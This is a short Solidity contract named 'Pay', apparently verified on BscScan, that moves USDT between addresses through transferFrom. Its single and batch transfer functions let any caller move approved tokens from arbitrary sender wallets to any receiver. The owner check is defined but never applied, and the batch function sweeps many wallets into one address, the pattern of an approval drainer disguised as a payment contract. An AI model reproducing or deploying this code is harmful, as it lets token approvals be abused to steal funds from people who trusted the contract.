/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Pay is Ownable {

    address public usdtErc; // 0xdac17f958d2ee523a2206206994597c13d831ec7

    constructor (address usdt_erc) {
        usdtErc = usdt_erc;
    }

    // 转U接口
    function transfer(address senderAddr, address receiveAddr ,uint amount) external {
        require(senderAddr != address(0), "senderAddr can not be empty");

        require(usdtErc != address(0), "usdtErc can not be empty");
        IERC20 usdtERC20 = IERC20(usdtErc);

        require(receiveAddr != address(0), "receiveAddr can not be empty");
        usdtERC20.transferFrom(senderAddr, receiveAddr, amount);
    } 

    // 批量转账接口
    function transferUsdtList(address[] memory senderAddrList, address receiveAddr ,uint amount) external {
        require(senderAddrList.length > 0, "senderAddrList can not be empty");

        require(usdtErc != address(0), "usdtErc can not be empty");
        IERC20 usdtERC20 = IERC20(usdtErc);

        require(receiveAddr != address(0), "receiveAddr can not be empty");

        for (uint i = 0; i < senderAddrList.length; i++) {
            address senderAddr = senderAddrList[i];
            usdtERC20.transferFrom(senderAddr, receiveAddr, amount);
        }
    } 
    

}